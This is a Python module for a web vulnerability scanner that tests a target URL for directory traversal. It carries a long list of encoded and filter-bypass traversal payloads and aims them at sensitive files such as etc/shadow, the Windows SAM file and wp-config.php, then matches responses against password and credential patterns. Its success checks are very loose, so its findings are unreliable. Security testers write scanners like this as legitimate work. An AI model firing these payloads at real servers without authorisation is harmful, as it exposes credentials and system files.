"""
Directory Traversal scanner module.

Tests for directory traversal/path traversal vulnerabilities by sending
payloads and analyzing responses.
"""

import requests
from urllib.parse import urljoin, urlparse, parse_qs
import re

class DirectoryTraversalScanner:
    """Scanner for detecting Directory Traversal vulnerabilities."""
    
    def __init__(self, target_url, timeout=10, depth=2, user_agent="WebScan/1.0.0", logger=None, verbose=False):
        """
        Initialize the Directory Traversal scanner.
        
        Args:
            target_url (str): The target URL to scan
            timeout (int): Request timeout in seconds
            depth (int): Scan depth level
            user_agent (str): User-Agent string to use in requests
            logger: Logger instance
            verbose (bool): Enable verbose output
        """
        self.target_url = target_url
        self.timeout = timeout
        self.depth = depth
        self.headers = {'User-Agent': user_agent}
        self.logger = logger
        self.verbose = verbose
        
        # Advanced directory traversal payloads with encoding and filter bypass techniques
        self.payloads = [
            # Basic traversal patterns
            "../", "../../", "../../../", "../../../../", "../../../../../", "../../../../../../",
            "../../../../../../../", "../../../../../../../../", "../../../../../../../../../",
            "../../../../../../../../../../", "../../../../../../../../../../../",
            
            # Windows specific
            "..\\", "..\\..\\", "..\\..\\..\\", "..\\..\\..\\..\\", "..\\..\\..\\..\\..\\",
            "..\\..\\..\\..\\..\\..\\", "..\\..\\..\\..\\..\\..\\..\\", "..\\..\\..\\..\\..\\..\\..\\..\\",
            "..\\..\\..\\..\\..\\..\\..\\..\\..\\", "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\",
            
            # URL encoding - single encode
            "%2e%2e%2f", "%2e%2e/", "%2e%2e%5c", "..%2f", "..%5c", "%2e%2e%c0%af",
            
            # Double encoding
            "%252e%252e%252f", "%252e%252e/", "%252e%252e%255c", "..%252f", "..%255c",
            
            # Mixed encoding
            "%2e%2e/%2e%2e/", "..%2f..%2f", "%2e%2e%5c%2e%2e%5c", "..%5c..%5c",
            
            # Unicode UTF-8 encoding
            "..%c0%af", "..%e0%80%af", "..%c1%9c", "..%c1%pc", "..%c0%9v", "..%c0%af",
            "..%25c0%25af", "..%c1%1c", "..%c1%af", "..%ef%bc%8f",
            
            # Path and dot truncation
            ".../", "....", "....//", "..../\\/", 
            
            # Null byte injection (to terminate string processing in some languages)
            "../%00", "..\\%00", "../%00index.html", "..\\%00index.html", 
            "%00../../", "%00..\\..\\",
            
            # Filter bypass techniques
            "./.", "..//", "..//./", "..//.//", "/..//", "/...//", "....//",
            "...//../", "..///././/", "..///.//././/",
            
            # Semicolon bypass
            ";/../../", ";\\..\\..\\",
            
            # Combined techniques
            "..///////..//.//../////", "..%25252f..%25252f",
            "../../;/////", "..%u002f../", 
            
            # Path normalization abuse
            ".//.././/.././/././/../", "//.//../", "/.//..//",
            
            # Excessive trailing slash/backslash
            "..///////", "..\\\\\\\\\\\\",
            
            # Other exotic encodings
            "%%32%65%%32%65/", "%uff0e%uff0e/%uff0e%uff0e/", 
            "%e0%ae%a5%e0%ae%a5/",
            
            # Bypass techniques for specific applications
            "....//", "..../\\/", "..../\\",
            
            # NGINX specific bypasses
            "../\\", "..%5c..", "\\../",
            
            # IIS specific bypasses
            "..%c0%2f", "..%c1%9c"
        ]
        
        # Target files to try accessing (Unix and Windows)
        self.target_files = [
            # Unix sensitive files
            "etc/passwd",
            "etc/shadow",
            "etc/hosts",
            "proc/self/environ",
            "var/log/apache/access.log",
            "var/log/apache2/access.log",
            "var/log/httpd/access.log",
            "var/www/html/index.php",
            "var/www/html/index.html",
            "var/www/index.php",
            "var/www/index.html",
            
            # Windows sensitive files
            "windows/system32/drivers/etc/hosts",
            "windows/win.ini",
            "windows/system.ini",
            "windows/repair/sam",
            "boot.ini",
            "autoexec.bat",
            "config.sys",
            
            # Common web server files
            "apache/logs/access.log",
            "apache/logs/error.log",
            "apache2/logs/access.log",
            "apache2/logs/error.log",
            "httpd/logs/access.log",
            "httpd/logs/error.log",
            
            # Web application files
            "wp-config.php",
            "config.php",
            "configuration.php",
            "settings.php",
            "database.php",
            "db.php",
            "conf.php",
            "config.inc.php"
        ]
        
        # Patterns that might indicate successful directory traversal
        self.detection_patterns = [
            # Unix /etc/passwd patterns
            r"root:.*:0:0:",
            r"nobody:.*:99:99:",
            r"daemon:.*:1:1:",
            
            # Windows patterns
            r"\[boot loader\]",
            r"\[operating systems\]",
            r"WINDOWS\\system32",
            
            # General file content patterns
            r"<!DOCTYPE html>",
            r"<html",
            r"<body",
            r"<?php",
            r"DB_NAME",
            r"DB_USER",
            r"DB_PASSWORD",
            r"database_name",
            r"database_user",
            r"database_password",
            
            # Log file patterns
            r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3} - -",  # IP address pattern in logs
            r"GET /",
            r"POST /",
            
            # Config file patterns
            r"define\s*\(\s*('|\")DB_",
            r"config\s*=",
            r"$db\s*=",
            r"$config\s*=",
            r"$database\s*="
        ]
        
        # Compile regex patterns
        self.compiled_patterns = [re.compile(pattern, re.IGNORECASE) for pattern in self.detection_patterns]
    
    def _extract_parameters(self, url):
        """
        Extract GET parameters from a URL.
        
        Args:
            url (str): The URL to extract parameters from
            
        Returns:
            dict: Dictionary of parameters and values
        """
        parsed_url = urlparse(url)
        return parse_qs(parsed_url.query)
    
    def _construct_traversal_urls(self):
        """
        Construct URLs with directory traversal payloads.
        
        Returns:
            list: List of payload URLs to test
        """
        parsed_url = urlparse(self.target_url)
        base_path = parsed_url.path
        
        # Extract path components
        path_components = base_path.split('/')
        if path_components[-1] and '.' in path_components[-1]:  # If the last component looks like a file
            path_components.pop()  # Remove the file part
        
        base_directory = '/'.join(path_components)
        if not base_directory.endswith('/'):
            base_directory += '/'
        
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{base_directory}"
        
        # Generate payload URLs
        payload_urls = []
        
        # Test for file access via traversal
        for payload in self.payloads:
            for target_file in self.target_files:
                payload_url = urljoin(base_url, f"{payload}{target_file}")
                payload_urls.append((payload_url, f"{payload}{target_file}"))
        
        # Test parameters as well if they exist
        parameters = self._extract_parameters(self.target_url)
        if parameters:
            for param_name, param_values in parameters.items():
                for payload in self.payloads:
                    for target_file in self.target_files:
                        traversal_payload = f"{payload}{target_file}"
                        param_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{param_name}={traversal_payload}"
                        
                        # Add other parameters back
                        for p_name, p_values in parameters.items():
                            if p_name != param_name:
                                param_url += f"&{p_name}={p_values[0]}"
                        
                        payload_urls.append((param_url, traversal_payload))
        
        return payload_urls
    
    def _is_traversal_successful(self, response_content, response_status=None, response_headers=None):
        """
        Check if the directory traversal attempt was successful using multiple detection techniques.
        Uses aggressive pattern matching and content analysis for real exploitation confirmation.
        
        Args:
            response_content (str): The response content to check
            response_status (int, optional): The HTTP status code of the response
            response_headers (dict, optional): The HTTP headers of the response
            
        Returns:
            bool: True if directory traversal was successful, False otherwise
        """
        # Check for standard file content patterns
        for pattern in self.compiled_patterns:
            if pattern.search(response_content):
                return True
        
        # More sophisticated content-type-based detection
        if response_headers and 'Content-Type' in response_headers:
            content_type = response_headers['Content-Type'].lower()
            
            # If we're requesting config files but getting text/plain or application/octet-stream,
            # it's a strong indicator of successful traversal
            if ('text/plain' in content_type or 'application/octet-stream' in content_type):
                # Check for signs of configuration files in non-HTML content
                config_indicators = [
                    # Database connection strings
                    r"(mysql|postgresql|sqlite)://([\w.]+):(\w+)@",
                    r"(sqlserver|mssql)://([\w.]+);",
                    r"(conn|connection|connect).*string",
                    r"jdbc:(mysql|postgresql|oracle|sqlserver)",
                    
                    # Config file patterns
                    r"(?i)(api_?key|secret_?key|app_?secret|token|password|auth)[\s:=]+['\"]([\w-]+)['\"]",
                    r"(?i)(username|user)[\s:=]+['\"]([\w-]+)['\"]",
                    
                    # INI/Config style entries
                    r"^\[.+\]$[\r\n]+(?:([\w\d._]+)[\s:=](.*))+",  # INI section with key-value pairs
                    
                    # XML patterns (simplified)
                    r"<\?xml",
                    r"<([a-zA-Z0-9]+)>.*</\1>",
                    
                    # JSON patterns (simplified)
                    r"\{[\s]*\"[^\"]+\"[\s]*:[\s]*\"[^\"]*\"",
                    
                    # Environment variable style
                    r"([A-Z_]+)=(.*)"
                ]
                
                for pattern in config_indicators:
                    if re.search(pattern, response_content, re.MULTILINE):
                        return True
                
                # If the file contains non-printable characters, it may be a binary file
                if any(ord(c) < 32 and c not in '\r\n\t' for c in response_content[:1000]):
                    # Binary file - could be a system file
                    return True
        
        # Status code-based detection - some status codes are less common in normal web responses
        if response_status and response_status in [200, 206, 403, 302, 307]:
            # For these status codes, look more carefully at the content length and type
            if response_headers:
                # File downloads are often indications of successful traversal
                if ('Content-Disposition' in response_headers and 
                    'attachment' in response_headers['Content-Disposition'].lower()):
                    return True
                
                # Unusual content types for web pages but normal for files
                unusual_content_types = ['application/octet-stream', 'application/x-download', 
                                        'text/plain', 'application/pdf', 'application/x-msdownload']
                if ('Content-Type' in response_headers and 
                    any(ctype in response_headers['Content-Type'].lower() for ctype in unusual_content_types)):
                    return True
        
        return False
    
    def _check_error_responses(self, response_content, response_status=None):
        """
        Check if response contains error messages that might indicate a vulnerability.
        Uses more aggressive pattern matching for real-world directory traversal indicators.
        
        Args:
            response_content (str): The response content to check
            response_status (int, optional): The HTTP status code of the response
            
        Returns:
            bool: True if error messages were found, False otherwise
        """
        # Expanded error patterns - looking for path disclosure in errors
        error_patterns = [
            # PHP errors
            r"Warning: include\([^)]+\): failed to open stream",
            r"Warning: include_once\([^)]+\): failed to open stream",
            r"Warning: require_once\([^)]+\): failed to open stream",
            r"Warning: require\([^)]+\): failed to open stream",
            r"Warning: file_get_contents\([^)]+\): failed to open stream",
            r"Warning: file\([^)]+\): failed to open stream",
            r"Warning: fopen\([^)]+\): failed to open stream",
            r"Fatal error: require_once\(\): Failed opening required",
            r"Fatal error: require\(\): Failed opening required",
            r"Fatal error: Uncaught Error: Failed opening required",
            
            # Java/.NET/Servlet errors
            r"java\.io\.FileNotFoundException: [^\r\n]+",
            r"Exception in thread .+ java\.io\.FileNotFoundException",
            r"System\.IO\.FileNotFoundException",
            r"Microsoft VBScript runtime error",
            r"Microsoft OLE DB Provider for SQL Server error",
            r"Error Occurred While Processing Request",
            r"Exception Details: System\.IO\.DirectoryNotFoundException",
            
            # Various open source application errors
            r"<b>Warning</b>: [^<]+open_basedir restriction in effect",
            r"<b>Warning</b>: [^<]+failed to open stream: No such file or directory in",
            r"<b>Warning</b>: [^<]+failed to open stream: Permission denied in",
            
            # General error patterns
            r"failed to open stream",
            r"cannot find the (path|file) specified",
            r"no such file or directory",
            r"The system cannot find the (path|file) specified",
            r"The file(.*?)does not exist",
            r"Permission denied",
            r"Access is denied",
            r"Error opening file",
            r"System.IO.FileNotFoundException",
            r"Unable to find the specified file",
            r"No such file",
            r"The file(s?) (.*) was not found",
            r"open_basedir restriction in effect"
        ]
        
        # Check for standard error patterns
        for pattern in error_patterns:
            if re.search(pattern, response_content, re.IGNORECASE):
                return True
        
        # Check for file path disclosure in error messages
        path_disclosure_patterns = [
            # Potential server paths in error messages or debug info
            r"(?:\/|\\)(?:var|etc|usr|opt|home|root|srv|htdocs|www|sites|webapps)(?:\/|\\).+", 
            r"(?:[A-Za-z]:\\)(?:Program Files|Windows|inetpub|xampp|wamp).+",
            r"(?:[A-Za-z]:\\)(?:[\w\s.\\-]+)",  # Windows paths
            r"(?:\/var\/www\/|\/home\/).+?\.(?:php|inc|aspx|asp|jsp|cfm|pl|cgi)",  # Unix web paths
            r"([A-Za-z]:\\[\w\s.\\-]+\.\w+)|(/[\w\s./-]+\.\w+)"  # Any file path
        ]
        
        for pattern in path_disclosure_patterns:
            if re.search(pattern, response_content, re.IGNORECASE):
                return True
        
        # Check HTTP status codes that might indicate path-related issues
        if response_status in [403, 500, 404]:
            # For these status codes, look for system messages that might reveal partial success
            status_related_patterns = [
                r"Not found",
                r"Not [Aa]uthorized",
                r"Access [Dd]enied",
                r"[Ff]orbidden",
                r"No permission"
            ]
            
            for pattern in status_related_patterns:
                if re.search(pattern, response_content, re.IGNORECASE):
                    # If we have a 403 status, it might mean the file exists but access is denied
                    # This is particularly interesting for directory traversal attempts
                    if response_status == 403:
                        return True
        
        return False
    
    def scan(self):
        """
        Start the directory traversal vulnerability scan.
        
        Returns:
            list: List of vulnerabilities found
        """
        vulnerabilities = []
        
        if self.logger:
            self.logger.info(f"Starting directory traversal scan on {self.target_url}")
        
        # Generate payload URLs
        payload_urls = self._construct_traversal_urls()
        
        if self.verbose and self.logger:
            self.logger.info(f"Generated {len(payload_urls)} payload URLs to test")
        
        # Test each payload URL
        for url, payload in payload_urls:
            try:
                if self.verbose and self.logger:
                    self.logger.info(f"Testing payload: {payload}")
                
                response = requests.get(
                    url, 
                    headers=self.headers, 
                    timeout=self.timeout,
                    allow_redirects=False
                )
                
                # Check response length - empty or very short responses are likely not vulnerable
                if len(response.text) < 10:
                    continue
                
                # Check for successful traversal or error messages that indicate vulnerability
                if (self._is_traversal_successful(response.text, response.status_code, response.headers) or 
                    self._check_error_responses(response.text, response.status_code)):
                    detail = f"Directory traversal possible with payload: {payload}"
                    
                    # Check if this is a parameter-based traversal
                    if '?' in url:
                        parsed_url = urlparse(url)
                        params = parse_qs(parsed_url.query)
                        
                        for param_name, param_values in params.items():
                            if payload in str(param_values):
                                detail = f"Parameter '{param_name}' is vulnerable to directory traversal using payload: {payload}"
                                break
                    
                    vulnerability = {
                        'type': 'Directory Traversal',
                        'url': url,
                        'payload': payload,
                        'status_code': response.status_code,
                        'response_length': len(response.text),
                        'details': detail,
                        'severity': 'High'
                    }
                    
                    vulnerabilities.append(vulnerability)
                    
                    if self.logger:
                        self.logger.warning(f"Directory traversal found: {detail}")
                    
                    # Limit the number of findings to avoid excessive outputs
                    if len(vulnerabilities) >= 10:
                        if self.logger:
                            self.logger.info("Limiting directory traversal findings to avoid excessive output")
                        break
            
            except Exception as e:
                if self.logger:
                    self.logger.error(f"Error testing payload {payload}: {str(e)}")
        
        if self.logger:
            self.logger.info(f"Directory traversal scan completed. Found {len(vulnerabilities)} vulnerabilities.")
        
        return vulnerabilities
